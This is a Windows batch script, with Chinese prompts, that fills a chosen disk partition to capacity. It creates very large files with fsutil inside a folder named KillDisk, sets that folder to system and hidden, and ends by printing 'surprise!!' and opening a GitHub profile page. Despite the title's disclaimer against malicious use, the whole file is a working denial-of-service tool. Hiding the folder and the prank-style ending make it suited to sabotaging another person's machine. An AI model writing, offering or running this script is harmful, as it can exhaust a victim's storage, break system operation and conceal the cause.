@echo off
title 暴力填满硬盘 建议在新建磁盘游玩，勿用作恶意用途
cls
set file=0
set bigger=10000000000000

:disk
SET/p Disk=请输入【需要被填满的磁盘分区】的盘符：
echo.
set %Disk%=%Disk:~0,1%
IF NOT EXIST "%disk%:\" (goto disk)
md %disk%:\KillDisk
attrib +s +h %disk%:\KillDisk

:start
set /a file=%file%+1
echo 正在填充第 %file% 个文件，文件大小：%bigger% 字节
fsutil file createnew %disk%:\KillDisk\%file% %bigger%>nul
IF NOT EXIST "%disk%:\KillDisk\%file%" (goto bigger)
goto start

:bigger
if /i "%bigger%"=="1" goto exit
if /i "%bigger%"=="10" set bigger=1
if /i "%bigger%"=="100" set bigger=10
if /i "%bigger%"=="1000" set bigger=100
if /i "%bigger%"=="10000" set bigger=1000
if /i "%bigger%"=="100000" set bigger=10000
if /i "%bigger%"=="1000000" set bigger=100000
if /i "%bigger%"=="10000000" set bigger=1000000
if /i "%bigger%"=="100000000" set bigger=10000000
if /i "%bigger%"=="1000000000" set bigger=100000000
if /i "%bigger%"=="10000000000" set bigger=1000000000
if /i "%bigger%"=="100000000000" set bigger=10000000000
if /i "%bigger%"=="1000000000000" set bigger=100000000000
if /i "%bigger%"=="10000000000000" set bigger=1000000000000
goto start

:exit
cls
echo 目标磁盘已经被完全填满！
echo surprise！！
pause
start https://github.com/MOCBear